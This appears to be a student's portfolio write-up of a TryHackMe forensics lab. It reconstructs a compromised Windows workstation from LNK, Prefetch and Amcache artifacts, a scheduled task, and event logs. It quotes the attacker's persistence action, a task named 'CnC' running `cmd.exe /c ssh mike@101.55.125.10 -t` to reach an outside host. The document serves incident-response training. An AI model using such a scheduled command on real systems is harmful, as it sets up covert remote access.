# Compromised Windows Analysis — Forensic Computing Lab

## Overview

**Completed October 28, 2026 — [100% room completion screenshot](./screenshots/Lab%20Completion%20Screenshot.png).**

I investigated a compromised Windows workstation in TryHackMe using Timeline Explorer, Task Scheduler, LECmd, PECmd, AmcacheParser, and Event Viewer. I correlated file artifacts, execution traces, persistence settings, and event logs to reconstruct the incident.

## Provided Incident

The scenario describes suspicious SSH attempts from Aashir’s workstation on March 29, 2025. The attempts repeated every minute and were refused, and Windows Defender was reported turned off. These details provided the starting point for the investigation.

## Investigation

1. **Timeline Explorer:** Started with Timeline Explorer as the workspace for reviewing and comparing parsed artifact CSVs.
2. **Persistence:** Located the `CnC` scheduled task. Its action was `cmd.exe /c ssh mike@101.55.125.10 -t`, identifying the configured SSH destination and account. The trigger starts at 10:29 AM on March 29, 2025; this is not proof of task creation time. The screenshot shows “repeat every 5 mi…,” differing from the scenario’s one-minute attempts.
3. **Recently accessed files:** Used LECmd to parse Recent-folder LNK files, including the shortcut referencing `Cursed.rar`, and loaded `Parsed-LNK.csv` into Timeline Explorer. The archive’s recorded **Target Created** value was `2025-03-29 10:26:07`; the shortcut was visible in Recent Items with a modified time of 10:27 AM.
4. **Execution evidence:** Used PECmd to parse Prefetch files and reviewed the CSV in Timeline Explorer. I found `CIPHER.EXE` after WinRAR activity near 10:29 AM. Its visible run count was **2**. My notes record **Source Created** as `2025-03-29 10:29:15`; the screenshot separately shows **Source Accessed** as `10:29:16`. These fields should not be substituted for an exact last-run timestamp.
5. **Executable metadata:** Reviewed the parsed Amcache CSV in Timeline Explorer. My notes record the suspected file as `c:\users\administrator\desktop\cursed\cipher.exe`, with SHA-1 `5b15c9d9ef36cae9f24ce63eebd190ac381bb734`. The screenshot confirms the CSV was open, but does not expose those columns. Amcache metadata complements the Prefetch evidence; it does not independently prove execution.
6. **Event logs:** Reviewed `Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational` for event **1149** and recorded the attacker source IP as `10.11.90.211` in my notes. The saved RDP screenshot shows successful authentication on October 28, 2026, rather than the incident record. The completion screenshot directly confirms Windows Defender event **5001**: real-time protection was disabled on March 29, 2025, at **10:25:14 AM**.

## Incident Timeline

Times below retain the displayed or noted values; the lab time zone was not recorded, so they have not been normalized to UTC.

| March 29, 2025 | Observation | Basis |
| --- | --- | --- |
| Time not retained | RDP authentication associated with source `10.11.90.211` | Lab notes; incident event details not captured |
| 10:25:14 AM | Defender real-time protection disabled | Event 5001 in completion screenshot |
| 10:26:07 AM | `Cursed.rar` target creation timestamp | Parsed LNK, Target Created |
| 10:27 AM | `Cursed` shortcut modified | Recent Items screenshot; not an exact archive-open time |
| 10:29 AM | `CnC` scheduled trigger begins | Task Scheduler screenshot |
| 10:29:15 AM | `CIPHER.EXE` Prefetch source creation recorded | Lab notes; execution activity near this time |
| 10:29:16 AM | `CIPHER.EXE` Prefetch source access recorded | Timeline Explorer screenshot |

## Findings and Reflection

The artifacts are consistent with a suspected sequence of remote access, Defender protection being disabled, archive arrival and access, executable activity, and scheduled SSH persistence. The recorded remote-access source (`10.11.90.211`) and SSH destination (`101.55.125.10`) serve different roles. The available records do not establish credential compromise, the exact RDP incident time, successful SSH connections, or that `cipher.exe` itself created the task. A filename alone also does not establish malicious behavior. I documented Defender protection being disabled; I did not independently verify the room’s separate “firewall” wording.

This lab gave me practice parsing LNK, Prefetch, and Amcache artifacts and comparing the results in Timeline Explorer with Windows event logs. It showed why source timestamps, target timestamps, and execution evidence need to be distinguished when reconstructing an attack path. Correlating these records helps investigate unauthorized access and identify security changes that warrant review, including remote-access controls and antivirus protection.

## Materials

- [TryHackMe room](https://tryhackme.com/room/compromisedwindowsanalysis)
- [Screenshots and evidence index](./screenshots/README.md)
- [Original notes taken during the lab](./documents/March%2029,%202025%20Security%20Event%20Log.rtf) — personal notes, not an exported Windows event log
- [Lab assignment](./documents/Forensics%20Lab_Compromised%20Windows%20Analysis.pdf)
- [Windows logs guidance](./documents/Guidance%20-%20Windows%20Logs%20Investigation.docx)
- [Back to portfolio](../../README.md)
